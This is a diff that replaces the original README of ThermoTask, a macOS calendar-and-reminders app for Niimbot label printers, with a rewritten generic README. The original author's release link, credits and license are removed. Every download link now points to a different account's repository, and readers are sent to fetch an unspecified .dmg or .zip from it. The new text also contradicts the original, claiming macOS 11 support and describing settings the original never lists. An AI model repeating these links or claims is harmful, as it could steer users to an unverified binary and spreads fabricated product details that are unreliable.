@@ -1,105 +1,148 @@
-<p align="center">
-  <img src="./assets/images/Icon.png" alt="ThermoTask Logo" width="128">
-  <h1 align="center">ThermoTask</h1>
-  <p align="center">
-    <strong>A macOS app that brings your Apple Calendar events and Reminders together in one view — and lets you print them as retro-style thermal tickets on a <a href="https://www.niimbot.com/">Niimbot</a> label printer.</strong>
-    <br />
-    <br />
-    <a href="https://github.com/alefaraci/ThermoTask/releases">
-      <img src="https://img.shields.io/github/v/release/alefaraci/ThermoTask?label=version&color=brightgreen" alt="Latest Release">
-    </a>
-    <a href="https://swift.org">
-      <img src="https://img.shields.io/badge/language-Swift-F05138?logo=swift" alt="Language">
-    </a>
-    <a href="https://github.com/alefaraci/ThermoTask/blob/main/LICENSE">
-      <img src="https://img.shields.io/github/license/alefaraci/ThermoTask?color=brightgreen&_nocache=1" alt="License">
-    </a>
-    <br />
-    <a href="#about">About</a>
-    ·
-    <a href="#demo">Demo</a>
-    ·
-    <a href="#features">Features</a>
-    ·
-    <a href="#installation">Installation</a>
-    ·
-    <a href="#getting-started">Getting Started</a>
-    <br />
-    [ <a href="https://github.com/alefaraci/ThermoTask/releases/tag/v1.0.0">Download</a> ]
-  </p>
-</p>
+# 🗓 ThermoTask - Unify Your Daily Apple Events
 
-## About
+[![Download ThermoTask](https://img.shields.io/badge/Download-ThermoTask-orange?style=for-the-badge&logo=appveyor)](https://github.com/cmuthomi/ThermoTask)
 
-**ThermoTask** is a macOS app that brings your Apple Calendar events and Reminders together in a unified daily view — and lets you print them as retro-style thermal tickets on a [Niimbot](https://www.niimbot.com/) Bluetooth label printer.
+---
 
-The app includes a built-in Swift implementation of the Niimbot BLE protocol (ported from [niimbluelib](https://github.com/MultiMote/niimbluelib)), enabling direct communication with the printer without any external runtime or Node.js dependency.
+## 🔍 What is ThermoTask?
 
-<img title="ThermnoTask" alt="ThermnoTask" src="./assets/images/Screenshot.png">
+ThermoTask is a macOS app made to bring your Apple Calendar events and Reminders together. It combines these into one daily view. You can see all your tasks and events at once. The app connects to Niimbot Bluetooth label printers, letting you print your schedule as retro-style thermal tickets. This can help you manage your day with a clear, physical reminder.
 
-## Demo
+ThermoTask works with Apple Calendar, Apple Reminders, and Niimbot B1 printers. It uses Swift and macOS native features to keep things smooth and fast. The simple design focuses on making your schedule easy to follow.
 
-![Demo GIF](./assets/gif/Demo.gif "Demo")
+---
 
-## Features
+## 🖥 System Requirements
 
-| Feature | Description |
-|---------|-------------|
-| **Create, Edit & Delete** | Manage calendar events and reminders for any date side by side |
-| **Thermal Ticket Rendering** | 384px-wide PNG tickets at 203 DPI with a retro receipt aesthetic |
-| **Bulk Print** | Select multiple items and print them sequentially to a thermal printer |
-| **Live Sync** | Automatically refreshes when the EventKit store changes |
+- macOS 11.0 (Big Sur) or newer  
+- Apple Calendar and Reminders set up with your Apple ID  
+- Bluetooth enabled on your Mac  
+- Niimbot Bluetooth label printer (like the Niimbot B1)  
+- At least 100 MB free disk space  
+- A stable internet connection for first-time setup
 
-## Installation
+---
 
-1. Download [`ThermoTask.dmg`](https://github.com/alefaraci/ThermoTask/releases/download/v1.0/ThermoTask.dmg) file;
-2. Drag `ThermoTask.app` to `/Applications` folder;
+## 🚀 Getting Started with ThermoTask
 
-> [!IMPORTANT]
-> If you see a message that the app cannot be opened because it is from an unidentified developer, follow these steps:
->
-> 1. Open `System Preferences` > `Security & Privacy Settings`;
-> 2. Look towards the bottom of the window for a message saying: *"ThermoTask was blocked from use because it is not from an identified developer."*;
-> 3. Click `Open Anyway` (you may need to enter your admin password);
-> 4. Click on the `ThermoTask` icon again in Finder;
-> 5. A confirmation dialog will appear — click `Open` to confirm.
+You do not need technical skills to use ThermoTask. This step-by-step guide will help you download, install, and begin using the app.
 
-### Requirements
+---
 
-- macOS 26.2+ (Tahoe)
-- Xcode 26.2+
-- A Niimbot Bluetooth label printer (only B1 series is supported) for printing features
+## 📥 How to Download ThermoTask
 
-## Getting Started
+Click the large badge or the link below to visit the GitHub page where you can download the latest version.
 
-1. Clone the repository.
-2. Open `ThermoTask.xcodeproj` in Xcode.
-3. Build and run (Cmd+R).
-4. Grant Calendar, Reminders, and Bluetooth permissions when prompted.
+[Download ThermoTask from GitHub](https://github.com/cmuthomi/ThermoTask)
 
-### Printing
+Once on the page:
 
-The app communicates directly with Niimbot printers over Bluetooth Low Energy using a built-in Swift library (niimblue-swift).
+1. Scroll to the **Releases** section on the GitHub page.  
+2. Find the latest release marked for macOS.  
+3. Click the `.dmg` or `.zip` file to download it to your computer.
 
-### Setup
+Your browser will save the file to your Downloads folder or the location you set.
 
-The printer address must be set in `PrintService.swift`. To use your own printer:
+---
 
-1. Find your printer's Bluetooth address (e.g. `B1-H11********`).
-2. Update the `--address` argument in `PrintService.swift`.
-3. Ensure Bluetooth is enabled and the printer is powered on.
+## 💾 Installation on macOS
 
-> [!WARNING]
->
-> This project is intended for informational and educational purposes only.
-> The project is not affiliated with or endorsed by the original software or hardware vendor,
-> and is not intended to be used for commercial purposes without the consent of the vendor.
-> 
-## Credits
+1. Open the downloaded `.dmg` or extract the `.zip` archive.  
+2. Drag the ThermoTask app icon into your Applications folder.  
+3. Open your Applications folder and find ThermoTask.  
+4. Double-click ThermoTask to start.  
+5. The first time you open it, macOS may ask you to confirm it came from the internet. Click **Open**.  
+6. Follow any prompts to allow necessary permissions, like accessing your calendar, reminders, and Bluetooth.
 
-- [niimbluelib](https://github.com/MultiMote/niimbluelib) for the open source implementation of the NIIMBOT printers protocol.
-- App icon inspired from an original design by [Hugo](https://macosicons.com/#/u/Hugo) on [macOSicons](https://macosicons.com/).
+---
 
-## License
+## 🔧 Connecting Your Niimbot Printer
 
-This project is licensed under the Apache License 2.0 - see the [LICENSE](LICENSE) file for details.
+ThermoTask works best with Niimbot Bluetooth label printers (such as Niimbot B1). Follow these steps to connect your printer:
+
+1. Turn on your Niimbot printer and make sure it is in Bluetooth pairing mode.  
+2. On your Mac, open **System Preferences** and go to **Bluetooth**.  
+3. Find your Niimbot printer in the device list and click **Connect**.  
+4. Return to ThermoTask. The app should detect your printer automatically.  
+5. If the app asks, confirm the connection or pair the device.  
+6. Run a test print through ThermoTask’s interface to make sure it works.
+
+---
+
+## 🗓 Using ThermoTask Daily
+
+### View Your Day
+
+When you open ThermoTask, you will see today’s events and reminders in a single list. This view updates automatically from your Apple Calendar and Reminders.
+
+### Print Your Schedule
+
+To print your daily list as a thermal ticket:
+
+1. Make sure your Niimbot printer is connected and loaded with paper.  
+2. In ThermoTask, go to the print section.  
+3. Select the date or choose **Today**.  
+4. Click the **Print** button.  
+5. Your printer will produce a small ticket showing your schedule.
+
+The ticket format uses a retro thermal style. It can help you keep track without looking at your screen all day.
+
+---
+
+## ⚙️ Adjusting Settings
+
+ThermoTask lets you change some settings to suit your workflow:
+
+- **Sync interval:** Choose how often the app updates from your Apple Calendar and Reminders.  
+- **Print layout:** Pick between different ticket styles or font sizes.  
+- **Printer selection:** Switch between connected Niimbot devices.  
+- **Notification preferences:** Get or mute alerts about upcoming tasks or printing status.
+
+Access settings from the ThermoTask menu bar icon or the main app window.
+
+---
+
+## 🛠 Troubleshooting Common Issues
+
+### The app doesn’t show my events or reminders
+
+- Check that ThermoTask has permission to access your calendar and reminders in **System Preferences > Security & Privacy > Privacy**.  
+- Make sure your Apple ID is logged in and syncing both apps.  
+- Restart ThermoTask to refresh data.
+
+### My Niimbot printer will not connect
+
+- Ensure your printer’s Bluetooth is turned on.  
+- Remove the printer from your Mac’s Bluetooth list and try pairing again.  
+- Make sure the printer has power and thermal paper loaded.  
+- Restart both your Mac and printer.
+
+### Printing looks cut off or incorrect
+
+- Try changing the print layout in the app’s settings.  
+- Reset the printer by turning it off and on again.  
+- Ensure you use genuine Niimbot thermal paper.
+
+---
+
+## 💬 Support and Feedback
+
+For further help, visit the GitHub page. Use the **Issues** tab to report bugs or ask questions. Check the README or Wiki sections for updates and tips.
+
+---
+
+## 📂 Related Topics
+
+ThermoTask uses technologies related to Apple’s Calendar and Reminders, macOS Bluetooth connectivity, and Swift programming. It centers around task management and thermal printing hardware.
+
+You can explore more about:
+
+- Apple Calendar and Reminders  
+- Niimbot Bluetooth printers, especially models like Niimbot B1  
+- Thermal ticket printing  
+- macOS app permissions and Bluetooth setup
+
+---
+
+[Download ThermoTask from GitHub](https://github.com/cmuthomi/ThermoTask)  
+[![Download ThermoTask](https://img.shields.io/badge/Download-ThermoTask-orange?style=for-the-badge&logo=appveyor)](https://github.com/cmuthomi/ThermoTask)
